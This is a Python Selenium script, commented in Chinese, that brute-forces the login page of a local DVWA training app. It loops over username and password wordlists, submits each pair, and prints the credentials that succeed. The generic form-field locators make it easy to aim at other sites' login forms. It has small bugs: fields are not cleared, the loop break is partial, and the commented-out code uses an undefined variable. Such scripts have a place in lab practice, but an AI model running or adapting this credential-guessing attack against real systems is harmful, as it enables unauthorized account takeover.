from selenium import webdriver

#初始化一个谷歌浏览器实例：browser
browser = webdriver.Chrome()
# browser = webdriver.Firefox() #火狐较慢

#最大化浏览器
browser.maximize_window() 
# browser.minimize_window()

#通过get()方法，打开一个url站点
browser.get("http://127.0.0.1/dvwa/login.php") 

#隐式等待10秒
browser.implicitly_wait(10)

#获得登陆前的验证信息：网站url和title
url_beforelogin = browser.current_url
title_beforelogin = browser.title

#定义爆破字典
userlist = []
pwdlist = []

#按行读取不带换行符的密码文件
with open('user.txt', 'r') as f:
    userlist = f.read().splitlines()

with open('passwordlist.txt', 'r') as f:
    pwdlist = f.read().splitlines()

for user in userlist:
    for pwd in pwdlist:
        #通过id或name属性定位用户名元素
        ele_user = browser.find_element_by_xpath('''//*[@id='user' or @id='username' or @id='Username' 
            or @id='name' or @id='yonghu' or @id='zhanghao' or @id='account' or @id='USERNAME' 
            or @id='USER' or @name='user' or @name='username' or @name='Username' or @name='name' 
            or @name='yonghu' or @name='zhanghao' or @name='account' or @name='USERNAME' 
            or @name='USER']''')
        ele_user.send_keys(user)

        #通过id或name属性定位密码元素
        ele_pwd = browser.find_element_by_xpath('''//*[@id='password' or @id='pass' or @id='pwd' 
            or @id='mima' or @id='passwd' or @id='PASSWORD' or @id='PWD' or @id='PASS' 
            or @id='Password' or @name='password' or @name='pass' or @name='pwd' 
            or @name='mima' or @name='passwd' or @name='PASSWORD' or @name='PWD' 
            or @name='PASS' or @name='Password']''')
        ele_pwd.send_keys(pwd)
        browser.find_element_by_name('Login').click() #登录

        #获得登陆后的验证信息：url和title
        url_afterlogin = browser.current_url
        title_afterlogin = browser.title

        #登录成功，记录用户名和密码
        if (title_beforelogin != title_afterlogin) or (url_beforelogin !=url_afterlogin):
            print("[+]用户名：" + user + ' ' + '密码：' + pwd)
            browser.implicitly_wait(10)
            break
        else:
            print("[-]用户名：" + user + ' ' + '密码：' + pwd)
            # ele_user.clear()
            # ele_pwd.clear()
            # # 清楚cookie,返回登录界面,继续其他用户的爆破
            # driver.delete_all_cookies()
            # driver.get('http://127.0.0.1/dvwa/login.php')
            browser.implicitly_wait(10)

#退出浏览器
browser.quit()